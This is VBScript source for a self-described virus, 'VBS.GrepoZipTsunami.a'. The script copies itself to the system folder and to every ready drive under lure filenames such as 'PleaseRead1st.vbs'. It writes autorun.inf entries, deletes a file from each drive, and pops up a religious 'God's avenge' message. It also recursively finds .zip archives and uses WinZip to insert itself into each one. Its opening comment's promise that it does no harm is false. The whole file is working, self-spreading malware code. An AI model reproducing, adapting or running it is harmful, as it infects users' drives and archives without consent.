' VBS.GrepoZipTsunami.a
' My first VBS virus. Padding itself into a zip file!
' Don't worry, it won't do harm to you.. I promise.
' SealNight5, Asmaradana
' MVS, USM, Malaysia.
' 2005-01-01

Set Fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Set tsunami = Fso.GetFile(WScript.ScriptFullName)
tsunami.Copy (Fso.GetSpecialFolder(1) & "\PleaseRead1st.vbs")
Set Drives = Fso.Drives

For Each Drive In Drives
On Error Resume Next
If Drive.isready Then
    Fso.Deletefile Drive & "tsunami.bat"
End If
Next

ret = Chr(13)
tsu1 = "It is God's avenge!" & ret
tsu2 = "Those people did bad on earth..." & ret
tsu3 = "God has promised, that He will give lesson," & ret
tsu4 = "and this is a promise that the End of Day" & ret
tsu5 = "is just not too far ahead!" & ret & ret
tsu6 = "Pray, do good and may God bless you!" & ret & ret
tsu7 = "Tell and share this message with everyone who has faith in God."

tsunamimsg = "C:\windows\tsunami.txt"
Set msg = Fso.Createtextfile(tsunamimsg, True)
msg.writeline tsu1 & tsu2 & tsu3 & tsu4 & tsu5 & tsu6 & tsu7
msg.Close
ws.run tsunamimsg

For Each Drive In Drives
If Drive.isready Then
    On Error Resume Next
    tsunami.Copy(drive&"\Tsunami - A must read - God's avenge.vbs")
    tsunami.Copy(drive&"\PleaseRead1st.vbs")
    
    tsunamirun = Drive & "autorun.inf"
    Set autorun = Fso.Createtextfile(tsunamirun, True)
    autorun.writeline "PleaseRead1st.vbs"
    autorun.Close
    
    SearchWinZip Drive & "\"
End If
Next

Function SearchWinZip(path)
    On Error Resume Next
    winzipexist = 1
    
    Set word = CreateObject("word.application")
    If word.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe", "") = "" Then
        winzipexist = 0
    End If
    
    If winzipexist = 1 Then
    
    Set folder = Fso.getfolder(path)
    Set Files = folder.Files
    
    For Each file In Files

    If Fso.GetExtensionName(file.path) = "zip" Then
        Set ws = CreateObject("wscript.shell")
        Set word = CreateObject("word.application")
        appword = word.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe", "")
        ws.run appword & " -a -r " & file.path & Chr(32) & " " & Fso.GetSpecialFolder(1) & "\PleaseRead1st.vbs"
    End If
    Next
        
    Set Subfolders = folder.Subfolders
    
    For Each Subfolder In Subfolders
        SearchWinZip Subfolder.path
    Next
    
    End If
End Function